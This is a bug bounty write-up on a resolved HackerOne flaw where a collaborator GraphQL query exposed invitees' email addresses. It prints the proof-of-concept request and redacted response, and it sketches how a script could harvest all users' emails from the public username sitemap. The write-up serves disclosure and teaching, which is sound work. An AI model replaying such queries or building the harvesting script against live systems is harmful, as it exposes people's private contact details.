---
title: "Getting email address of any HackerOne user worth $7,500"
datePublished: Thu Aug 03 2023 01:52:20 GMT+0000 (Coordinated Universal Time)
cuid: clkui4x2v00050al5dltq2sk6
slug: getting-email-address-of-any-hackerone-user-worth-7500
tags: infosec-cjbi6apo9015yaywu2micx2eo, bugbounty, hackerone

---

> ***Severity: High (7.5)  
> Weakness: Sensitive Information Disclosure  
> Bounty:* Duplicate *(The first researcher receives $7,500)***

Hey hunters, I’m back!

Just wanna share my recent finding in HackerOne’s own bug bounty program. This finding is pretty much straight forward :)

After submitting a report on HackerOne, I added my brother [hackerone.com/r3y](http://hackerone.com/r3y) to the collaborator and observed that the UI for adding collaborators was changed — see below (hmm interesting).

![](https://miro.medium.com/v2/resize:fit:700/1*MVbip_vFYXupU_qrnVDcYg.png align="center")

When I am seeing updates, I always try to play with it so I capture the request while adding collaborator and observed this new GraphQL query *“operationName”:”ReportCollaboratorQuery”*

I took 3 analysts' usernames including Co-Founder Jobert’s HackerOne username to test for PoC purposes and record the proof-of-concept.

Upon checking the response, I noticed that the email address of all collaborators was disclosed despite I used their HackerOne username only to invite them to the report.

```graphql
POST /graphql HTTP/2
Host: hackerone.com
Cookie: <redacted>
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer:<redacted>
Content-Type: application/json
X-Csrf-Token: <redacted>
X-Product-Area: other
X-Product-Feature: other
Content-Length: 832
Origin: https://hackerone
<SNIP>

{
  "operationName": "ReportCollaboratorQuery",
  "variables": {
    "reportId": <report-id>
  },
  "query": "query ReportCollaboratorQuery($reportId: Int!) {\n  report(id: $reportId) {\n    report_collaborators {\n      total_count\n      edges {\n        node {\n          id\n          user {\n            id\n            username\n            __typename\n          }\n          bounty_weight\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    report_collaborator_invitations {\n      total_count\n      edges {\n        node {\n          id\n          state\n          email\n          bounty_weight\n          recipient {\n            id\n            username\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

```graphql
HTTP/2 200 OK
Date: Wed, 21 Jun 2023 03:33:47 GMT
Content-Type: application/json; charset=utf-8
Cache-Control: no-store
Content-Disposition: inline; filename="response."
Vary: Accept
X-Request-Id: 31ef2c4f-e8fc-4544-b35d-bc219dd0ef64
Etag: W/"dbca3c53eb2d3558eca2c2735192ca7f"
Set-Cookie: <redacted>
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
<SNIP>

{
  "data": {
    "report": {
      "report_collaborators": {
        "total_count": 4,
        "edges": [
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydENvbGxhYm9yYXRvci8zNzkzMQ==",
              "user": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvMjU0OTI1Mw==",
                "username": "submit-a-security-vulnerabilit",
                "__typename": "User"
              },
              "bounty_weight": 0.01,
              "__typename": "ReportCollaborator"
            },
            "__typename": "ReportCollaboratorEdge"
          },
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydENvbGxhYm9yYXRvci8zNzAxNQ==",
              "user": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvMTU4Mzg0",
                "username": "r3y",
                "__typename": "User"
              },
              "bounty_weight": 0.01,
              "__typename": "ReportCollaborator"
            },
            "__typename": "ReportCollaboratorEdge"
          },
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydENvbGxhYm9yYXRvci8zNzAxNA==",
              "user": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvODg2ODM=",
                "username": "syjane",
                "__typename": "User"
              },
              "bounty_weight": 0.01,
              "__typename": "ReportCollaborator"
            },
            "__typename": "ReportCollaboratorEdge"
          },
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydENvbGxhYm9yYXRvci8zNzAxMw==",
              "user": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvNzgzNDc=",
                "username": "japz",
                "__typename": "User"
              },
              "bounty_weight": 1,
              "__typename": "ReportCollaborator"
            },
            "__typename": "ReportCollaboratorEdge"
          }
        ],
        "__typename": "ReportCollaboratorConnection"
      },
      "report_collaborator_invitations": {
        "total_count": 3,
        "edges": [
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL0ludml0YXRpb25zOjpSZXBvcnRDb2xsYWJvcmF0b3IvNDI0NTI1OQ==",
              "state": "accepted",
              "email": "<redacted>@gmail.com",
              "bounty_weight": 0.01,
              "recipient": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvODg2ODM=",
                "username": "<redacted>",
                "__typename": "User"
              },
              "__typename": "InvitationsReportCollaborator"
            },
            "__typename": "InvitedReportCollaboratorEdge"
          },
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL0ludml0YXRpb25zOjpSZXBvcnRDb2xsYWJvcmF0b3IvNDI1MDcyMg==",
              "state": "accepted",
              "email": "<redacted>@gmail.com",
              "bounty_weight": 0.01,
              "recipient": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvMjU0OTI1Mw==",
                "username": "<redacted>",
                "__typename": "User"
              },
              "__typename": "InvitationsReportCollaborator"
            },
            "__typename": "InvitedReportCollaboratorEdge"
          },
          {
            "node": {
              "id": "Z2lkOi8vaGFja2Vyb25lL0ludml0YXRpb25zOjpSZXBvcnRDb2xsYWJvcmF0b3IvNDI0NTI1OA==",
              "state": "accepted",
              "email": "<redacted>@gmail.com",
              "bounty_weight": 0.01,
              "recipient": {
                "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvMTU4Mzg0",
                "username": "r3y",
                "__typename": "User"
              },
              "__typename": "InvitationsReportCollaborator"
            },
            "__typename": "InvitedReportCollaboratorEdge"
          }
        ],
        "__typename": "InvitedReportCollaboratorConnection"
      },
      "__typename": "Report"
    }
  }
}
```

In the history of hacking hackers ([HackerOne](https://medium.com/u/6f816e37be2c?source=post_page-----afb8076ee395--------------------------------)), I know this type of vuln is High severity because it is super easy to exploit without user interaction. An attacker only needs a target username and a list of HackerOne usernames can be easily found here: [https://](https://hackerone.com/sitemap)[hackerone.com/sitemap](http://hackerone.com/sitemap)

That means a simple Python script can dump all HackerOne registered email addresses that are exactly tied up to the username.

I submitted the vulnerability, and as expected :))

![](https://miro.medium.com/v2/resize:fit:700/1*XgAUeS8s0fQgmE-AOu_LYw.png align="center")

I managed to know who the first reporter is because he posted his report ID on Twitter :)

![](https://miro.medium.com/v2/resize:fit:597/1*QK3PQ0qiZwumApZ3tOx02Q.png align="center")

After a few days, I know the vulnerability was already resolved because I saw the +2 reps on my profile reputation logs

![](https://miro.medium.com/v2/resize:fit:700/1*c_5XC3_0_ZD6DL02o_moBQ.png align="center")

The first researcher was rewarded with $7,500. Congrats man, you’re so fast :)

![](https://miro.medium.com/v2/resize:fit:561/1*DHUv6_kNug1HkavVKgus3w.png align="center")

---

I created this write-up to share and let you know that every new feature update may introduce a vulnerability or somehow result in a regression of a resolved and disclosed report in the past.

I’ve uploaded the PoC video to my youtube channel if you are interested to see what it looks like while testing the said Collaborator feature:

%[https://youtu.be/V8QciFxkkW8] 

In the PoC vid, you will observe an old UI for adding collaborators, this is because they reverted to the old UI after it introduces a new vulnerability and that was the time I created the video PoC. They deployed back the new UI after the vulnerability has been resolved.

The reference report from the first researcher was fully disclosed on HackerOne [https://hackerone.com/reports/2032716](https://hackerone.com/reports/2032716)

You will observe that the `GraphQL` query operation is different from the disclosed report and my write-up, but the root cause and impact of the vulnerability are the same so It’s considered duplicate. :)

Hope you guys learn something. Happy hacking everyone!

---

**Timeline:**

*June 21, 2023 — 11:57:32 PST — Report submitted*

*June 22, 2023 — 14:15:29 PST — Report marked as duplicate*

*June 29, 2023 — 23:40:45 PST — Report marked as resolved (based on my reputation log)*

**Twitter:** [https://twitter.com/japzdivino](https://twitter.com/japzdivino)